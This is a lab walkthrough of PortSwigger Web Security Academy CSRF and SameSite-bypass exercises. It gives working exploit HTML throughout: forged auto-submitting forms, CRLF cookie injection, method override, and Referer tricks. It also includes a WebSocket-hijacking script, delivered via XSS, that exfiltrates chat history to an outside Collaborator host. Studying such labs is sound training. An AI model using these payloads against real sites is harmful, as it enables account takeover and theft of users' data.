- [What is CSRF or XSRF?](#what-is-csrf-or-xsrf)
- [Validations To-Do](#validations-to-do)
- [CSRF vulnerability with no defenses](#csrf-vulnerability-with-no-defenses)
- [CSRF where token validation depends on request method](#csrf-where-token-validation-depends-on-request-method)
- [CSRF where token validation depends on token being present](#csrf-where-token-validation-depends-on-token-being-present)
- [CSRF where token is not tied to user session](#csrf-where-token-is-not-tied-to-user-session)
- [CSRF where token is tied to non-session cookie](#csrf-where-token-is-tied-to-non-session-cookie)
- [CSRF where token is duplicated in cookie](#csrf-where-token-is-duplicated-in-cookie)
- [SameSite Lax bypass via method override](#samesite-lax-bypass-via-method-override)
- [SameSite Strict bypass via client-side redirect](#samesite-strict-bypass-via-client-side-redirect)
- [SameSite Strict bypass via sibling domain](#samesite-strict-bypass-via-sibling-domain)
- [SameSite Lax bypass via cookie refresh](#samesite-lax-bypass-via-cookie-refresh)
- [CSRF where Referer validation depends on header being present](#csrf-where-referer-validation-depends-on-header-being-present)
- [CSRF with broken Referer validation](#csrf-with-broken-referer-validation)

---
# What is CSRF or XSRF?

CSRF or Cross Site Request Forguery. When the user logs in can do things like change the email, the profile image... Account session remains open for a while, then, the evil actor can create a malicious website and automate some of this action, change the email, profile image...

# Validations To-Do

- Change request method and remove CSRF token.
- Remove the CSRF token with the same method.
- With two users try to use the csrf token of one in the other account and see if we can change the email.
# CSRF vulnerability with no defenses

This is a very simple case, if you try to intercept the request when change the email you see a new endpoint, **my-account/change-email** that doesn't have csrf_token and nothing, only the email and the cookie session. 

```html
<form class="login-form" name="change-email-form" action="https://0afa0059033cfb278178117c00c90042.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
document.forms[0].submit();
</script>
```

document.forms[0].submit() -> Is the way to submit the form via javascript. You can copy the form with any of the page.

# CSRF where token validation depends on request method

Side server have to apply differents validations, in this case the request work with POST, but what happens if we change the method to GET?

When you have the request right click in repeater > change request method.

If you send now the request you see that works well via GET, but if you try to remove the CSRF token?.

Ups, works well!.

**In our exploit server we can do the request with GET and without csrf token**.

```html
<form class="login-form" name="change-email-form" action="https://0a87002503b4bf318075035300f900dd.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="pwned@test.com">
</form>

<script>
document.forms[0].submit();
</script>
```

# CSRF where token validation depends on token being present

This is very simple lab, we request the request with burp and remove the CSRF token, the server is not validating the csrf_token. Good job, implement something for not validate after.

```html
<form class="login-form" name="change-email-form" action="https://0a48006504829b8d80da034c006c0045.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@test.com">
</form>

<script>
document.forms[0].submit();
</script>
```

# CSRF where token is not tied to user session

In this lab, when we intercept the request to change the email, we see that when try to change the email have different csrf token, we can't omit the csrf token or change the method.

In this lab gives us two users. If we try to change the email in different users we see the different tokens, but **what happens if we try to use the csrf token of one user in the other**?.

```html
<form class="login-form" name="change-email-form" action="https://0a4b00a403693622829d434300c90045.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="pwned@wiener.com">
<input type="hidden" name="csrf" value="Vpqd4tl22iAvUEIeh4dM7VxHuMNkOC34">
</form>

<script>
document.forms[0].submit();
</script>
```

# CSRF where token is tied to non-session cookie

Open a session in Firefox and other in burpsuite explorer.

In firefox you have to log in with one user, in this case the description of the lab doesn't say nothing, but if you search a word in search field you obtain a new cookie, **LastSearchTerm**. Search something an intercept the request.

After open the burpsuite explorer and log in with the other user, in my case carlos. Change the email and intercept the request.

One time you have both request you see in the request of wiener that have the cookie LastSearchTerm. 

- First of all we check if the csrf token change for every request, is not the case.

- You can try to remove the csrf_token, remove some letter, remove some letter to the cookie csrfKey and with this you see that the request is doesn't valid if csrfKey is not valid.

- But if you take the csrfKey and csrf token of the user carlos and use in user wiener works well.

- And what happens with LastSearchTerm, we see that is reflected in **Set-Cookie** header, **what happens if we try to break adding a semicolon?**.

Intercept the request of search term and send to repeater:

```html
?search=prueba;
```

In the response we see that the semicolon is reflected without sanitization :o

```html
Set-Cookie: LastSearchTerm=prueba;;
```

You can try to indicate the csrfToken cookie:

```
?search=prueba;%20csrfKey=a
```

We can try to obtain the response of this request. Intercept > Right click > Do intercept > Response to this request. Forward, forward.

And when try to obtain academyLabHeader you see that the **cookie doesn't change**:

```html
Cookie: session=GNV7kKDBQWEMrbkIJwAMPbddUiwAhy4Z; csrfKey=PAx77mZ8o8EcRrTpVlzziQzXsspv8Uqf; LastSearchTerm=prueba
```

You have another ways to do this. You can try to add a Set-Cookie header, in this case this is possible if you use jump line `\n` and carriage return `\r`. 

In url-encode format:
`\n` -> %0d
`\r` -> %0a

```
/?search=prueba;%0d%0aSet-Cookie:%20csrfKey=a
```

This is the same that:
```
/?search=prueba;
Set-Cookie: csrfKey=a
```

If you try this in repeater you see that you're injecting a new Set-Cookie header.

Now if you put that csrf_key value is hacked uou're going to obtain the same csrf token:

```
/?search=prueba;%0d%0aSet-Cookie:%20csrfKey=hacked
```

The idea is to build a server that send the request setting the csrfKey with our value, in this case we are going to use the user wiener.

Using endpoint search to change the csrfKey with the value of wiener user:

```
/?search=prueba;%0d%0aSet-Cookie:%20csrfKey=PAx77mZ8o8EcRrTpVlzziQzXsspv8Uqf
```

We have to add `; SameSite=None` to define that a cookie is accesible from different places:

```
/?search=prueba;%0d%0aSet-Cookie:%20csrfKey=PAx77mZ8o8EcRrTpVlzziQzXsspv8Uqf%3b%20SameSite=None
```

This is the code of the exploit server:

```html
<form class="login-form" name="change-email-form" action="https://0a88002604f05ab082590102009600ec.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
    <input type="hidden" name="csrf" value="NeeYYsBLswID0LiPFJPnc0AfcO4evpot">
</form>

<img src="https://0a88002604f05ab082590102009600ec.web-security-academy.net/?search=prueba;%0d%0aSet-Cookie:%20csrfKey=PAx77mZ8o8EcRrTpVlzziQzXsspv8Uqf%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

1. We copy the html code of the email form and modify like other labs.
2. We add the csrf token of user wiener.
3. We create an image(default size is 1x1) with the url of search term that have the payload injecting the Set-Cookie header.
4. When the request of the image finish this give an error and when give that error we send the form with the email and the csrf token.

How the csrfKey and csrf token are valid we can do a valid request for change an email of the user that open our server.

# CSRF where token is duplicated in cookie

In this case if we obtian the request when change email if we remove some letter of csrf key or csrf token obtain a 400 bad request, but if we change both with the same value that is 200. This is a disaster you can put what you want in both fields and obtain a 200 ok.

If we check the search field we see that we have the **LastSearchTerm** as the previous laboratory.

We have to do the same, but csrf key and csrf token in this case is the same, example 'test'.

```html
<form class="login-form" name="change-email-form" action="https://0ace000d030e53a581a9074900ba00df.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
    <input type="hidden" name="csrf" value="test">
</form>

<img src="https://0ace000d030e53a581a9074900ba00df.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

# SameSite Lax bypass via method override

If we intercept the request we see that doesn't have csrf key, csrf token nothing. This is very simple, we can create our server and send the request via post and when the user click as he has the session cookie change his own email.

But is not the idea of this lab, in the title put "method override", if we try to change the method to GET, in repeater right click > change request method.

With GET is more easy because only have to send the link with the new email, but if we send the request we see that the method is not allowed.

Sometimes, depend of how the backend is constructed you can override the method chaining `&_method=POST`

```
/my-account/change-email?email=test%40test.com&_method=POST
```

With this the backend think that is sending by POST.

In exploit server with a simple redirection:

```html
<script>
location = 'https://0ab4004004f593328198214500d200d3.web-security-academy.net/my-account/change-email?email=pwned%40pwned.com&_method=POST';
</script>
```

# SameSite Strict bypass via client-side redirect

We are going to using a redirect in the same site to do the CSRF.

In this case we can change the request to GET and when we send the request is valid.

We can try to add to exploit server.
```
<script>
location = 'https://0a7f006d046f159a80b703e500410045.web-security-academy.net/my-account/change-email?email=test@test.com&submit=1';
</script>
```

But when click in "deliver exploit to victim" button doesn't work adn redirect to login page, why?

Let's go to intercept the requests with 'View exploit' button.

In the request of when we are sending the url we see that we are not sending the session cookie:

```
GET /my-account/change-email?email=test@test.com&submit=1 HTTP/2
Host: 0a7f006d046f159a80b703e500410045.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://exploit-0ab700e804c9157e806a022801ca0095.exploit-server.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Priority: u=0, i
Te: trailers
```

If we send to intruder and send in response we see
```
Set-Cookie: session=1EjKr1jA1SvaeDPrEC6Wy8y9Xe9ggO00; Secure; HttpOnly; 
```

This is a cookie security mechanism, called sameSite, exactly is using `samesite=Strict`. Samesite restritcs how cookies are sent in cross-site request, this prevent CSRF.

An example is with our exploit server, if we send the request from our malicious server the cookies doesn't interchange.

The idea is to redirect the user from the original page, we have to find a way to avoid  samesite.

If we to the login page and then go to home you find post, if you enter in a post and create a comment.

We don't see nothing innusual, only that redirect automatically to the post page. If we go to HTTP history in burpsuite we see the request via POST to /post/comment and a request to `/resources/js/commentConfirmationRedirect.js`:

```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

In this url `/post/comment/confirmation?postId=3` we can try to replace postId to another path:

```
/post/comment/confirmation?postId=test
```

This redirect to /post/test thanks to javascript code.

You can try to redirect to another path in the page and see if the session cookie is dragging well.

```
/post/comment/confirmation?postId=../my-account
```

Let's go to test in the exploit server:

```
<script>
location = 'https://0a7f006d046f159a80b703e500410045.web-security-academy.net/post/comment/confirmation?postId=../my-account';
</script>
```

Okeey, this works, is redirecting from /post/comment/confirmation to /my-account. This is possible because we are not in a third-part website, we're inside of the website but use the redirect to my-account. It's important to url encode the `?` and `&` because we're using another `?` and it is important demonstrate that is inside the other query.

```html
<script>
location = 'https://0a7f006d046f159a80b703e500410045.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3Femail=pwned@pwned.com%26submit=1';
</script>
```

# SameSite Strict bypass via sibling domain

This lab contain live chat and is vulnerable to **cross-site WebSocket hijacking (CSWSH)** and the idea is to exfiltrate the victim's chat history that contain victim credentials.

When you open the live chat tab you can try html injections...

```html
</td></tr><h1>test</h1>
```

But is doesn't care.

If we see the HTTP history in /chat request we can see `/resources/js/chat.js`. If we open we can see this header:

- `Access-Control-Allow-Origin: https://cms-0ab700de036cfca480fd268c00ba00f4.web-security-academy.net`: 

This header indicate what origins are allowed to acess to the resources of the server.

If we open this website we find another login panel.

In burpsuite we have WebSockets history tab where we can find all the message that we are exchanging.

When we reload the page we see that the message are loading, could be interesting know how the server obtain all the messages.

You can delete all the messages and reload the page.

We send 'READY' in raw, I imagine that is using our session cookie and in the title of the lab is using **SameSite=Strict**, if you open some request and change the session cookie you are going to see the value.

If we try to do something with our third party domain we're not to use the cookie of the victim domain by simesite cookie, but we find a in chat.js that `cms-` domain is allowed in the header `Access-Control-Allow-Origin:`. If we find a way to send data from here we could do something.

Now the idea is to try to connect to the HTTP web socket.
We have to create a websocket that send 'READY'.

We are going to put this script in our exploit server.

```html
<script>
	var ws = new WebSocket("https://0ab700de036cfca480fd268c00ba00f4.web-security-academy.net/chat");
	ws.onopen = function() {
		ws.send("READY");
	};

	ws.onmessage = function(info) {
		fetch("https://rup0hqd8w6h3ei03uhynnhwqehk88zwo.oastify.com?data=" + btoa(info.data));
	};
</script>
```

This script create a websocket connection with the victim URL, we open the websocket and send a message with 'READY' content.

Then create a function to obtain the response, this response we're going to send to a Collaborator URL in base64.

When you store and view exploit you have to go to collaborator and reload, but you don't see nothing, if you reload the exploit server page again you are going to see things in the Collaborator.

If we decode the response obtained from the collaborator we see this:

```
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
```

What happens? We are only seeing that we are connected, but we don't see the full history, this happends because we are doing this from a third part and the session cookie is not exchange.

If we go to cms- subdomain we see that the user is reflected, we can try to do an HTML injection and it works and if we try to inject javascript code also work.

What happens if we use this XSS to inject the javascript code seen above. If don't work the first time when you submit the form, try again and see if in the collaborator have more data(remember to clean the history to obtain more clarity)

Nice, we obtain the chat of our session, the idea now is to obtain the chat of other session. For this we are going to **obtain the login request and change the method from POST to GET**. 

We're going to send to try if work, the next step is to create the exploit server:

```html
<script>
    location = 'https://cms-0ab700de036cfca480fd268c00ba00f4.web-security-academy.net/login?username=%3Cscript%3E+%09var+ws+%3D+new+WebSocket%28%22https%3A%2F%2F0ab700de036cfca480fd268c00ba00f4.web-security-academy.net%2Fchat%22%29%3B+%09ws.onopen+%3D+function%28%29+%7B+%09%09ws.send%28%22READY%22%29%3B+%09%7D%3B++%09ws.onmessage+%3D+function%28info%29+%7B+%09%09fetch%28%22https%3A%2F%2Frup0hqd8w6h3ei03uhynnhwqehk88zwo.oastify.com%3Fdata%3D%22+%2B+btoa%28info.data%29%29%3B+%09%7D%3B+%3C%2Fscript%3E&password=pass';
</script>
```

Store, clean collaborator history and deilver exploit to victim. Nice, we obtain the chat of the victim, one of the requests made to the collaborator is

```
{"user":"Hal Pline","content":"No problem carlos, it's cvnazj3mhvdevsqv1gam"}
```

Remember, this is possible because we discover a XSS in cms subdomain and this allow us to avoid the SameSite=Strict draggin the same session.

# SameSite Lax bypass via cookie refresh

When the SameSite is setting in Lax in place of strict the cookie can be send in request in the same web or in requests GET with another sites.

In the description of this lab tell us that the user use OAuth-base login, this allow to log in in different domains, microsoft, github... to retrieve some information, email, name... In this case is a invented social media.

First of all is use foxyproyxy to turn on our burpsuite proxy and save all the response and request in burp, then we can try to login with `wiener:peter`.

The requests flow is the following:

- When the page redirect to social media login use the endpoint `/social-login`, in the code of the request we see that we have a session cookie
- In `oauth-callback?code=...` we see that in the request is using the same session cookie that in `/social-login` but in the response the session cookie change to another value and in the following requests is using this new cookie(because set with the header Set-Cookie: session...)

In our exploit server we can try to change the email because we don't see any flag like SameSite=Strict or something like that when set the new cookie.

```html
<form class="login-form" name="change-email-form" action="https://0a25004704720d218297fb6100270005.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

If we click in the button 'view exploit' we see that is valid and change our email, but if we 'deliver exploit to victim' doesn't work because is possible that the victim not logged in.

If the user is not logged have another session cookie(remember that change the session cookie when login with oauth).

If you log out and log in again you see that you don't have to introduce the credentials, automatically log in, we can try to go to that endpoint open a new tab.

```html
<form class="login-form" name="change-email-form" action="https://0a25004704720d218297fb6100270005.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
    window.open("https://0a25004704720d218297fb6100270005.web-security-academy.net/social-login");
    document.forms[0].submit();
</script>
```

If you're not authenticated if you try to change the email it's not going to work because the session cookie is another one.

To solve this lab we can add a timeout.

```html
<form class="login-form" name="change-email-form" action="https://0a25004704720d218297fb6100270005.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
    window.open("https://0a25004704720d218297fb6100270005.web-security-academy.net/social-login");
    setTimeout(updateEmail, 5000);
    function updateEmail(){
	    document.forms[0].submit();
	}
</script>
```

The function setTimeout call updateEmail after five seconds have passed. This functions send the form, a post request to /change-mail endpoint and since there has been enought time for the OAuth flow to be completed can change the email without any problems.

# CSRF where Referer validation depends on header being present

Referer header allow to identify where the people who vistim the page come(another page https://example.com) and this is used to perform analysis.

If we intercept the request of change-email endpoint we see that don't have csrf token.

We can try to create our exploit server:

```html
<form class="login-form" name="change-email-form" action="https://0aff007a032c2dd382ef3395001d0062.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden name="email" value="">
</form>

<script>
document.forms[0].submit();
</script>
```

If you store and view expoit you have to see this:

```
"Invalid referer header"
```

It seems like we need that the server is checking the referer header. If you obtain the request you see that the header is from exploit server and should come from victim server.

If you try to **delete the header "referer"** to see what happens you observe that change the email.

```html
<html>
	<head>
	    <meta name="referrer" content="no-referrer">
	</head>
	<form class="login-form" name="change-email-form" action="https://0aff007a032c2dd382ef3395001d0062.web-security-academy.net/my-account/change-email" method="POST">
	    <input type="hidden" name="email" value="pwned@pwned.com">
	</form>
	
	<script>
		document.forms[0].submit();
	</script>
</html>
```

You can add this meta tag that allow you to remove the header:

```html
<meta name="referrer" content="no-referrer">
```

The header is referer because a grammatical error was made when it was created.

# CSRF with broken Referer validation

The same, we don't see any csrf token, we can try to create the exploit server:

```html
<form class="login-form" name="change-email-form" action="https://0a5700db03d2d47c802a3f0e009c0091.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
document.forms[0].submit();
</script>
```

We obtain the same response of the before lab:

> `"Invalid referer header"`

In this case the server want that the referer point to the victim server if you try to remove the header you see that doesn't work, if you try to replace the header referer to the URL of the victim `Referer: 0a5700db03d2d47c802a3f0e009c0091.web-security-academy.net` you see that the email changed.

Now, we can know how the server is validating this refereed header.
What happens if we remove one character?
What happens if we add more characters at the first?

We see that is searching that the header value string **contain** the victim url. 

If we change the file in the url server? In place of /exploit we can use /0a5700db03d2d47c802a3f0e009c0091.web-security-academy.net

It's a good idea but this doesn't work, if you try and obtain the requests in burpsuite you can see that the refereer header doesn't change.

By default the browser have a security policy for the referrer header, if you search for **unsafe-url referrer** we can try to inject this header to accomplish this.

```html
Referrer-Policy: unsafe-url
```

In head section of our exploit server add the header.

How would the server exploit look?

File:
```
/0a5700db03d2d47c802a3f0e009c0091.web-security-academy.net
```

Head:
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

Body:
```html
<form class="login-form" name="change-email-form" action="https://0a5700db03d2d47c802a3f0e009c0091.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="pwned@pwned.com">
</form>

<script>
document.forms[0].submit();
</script>
```

If you see the request you're going to see that the referer header change.

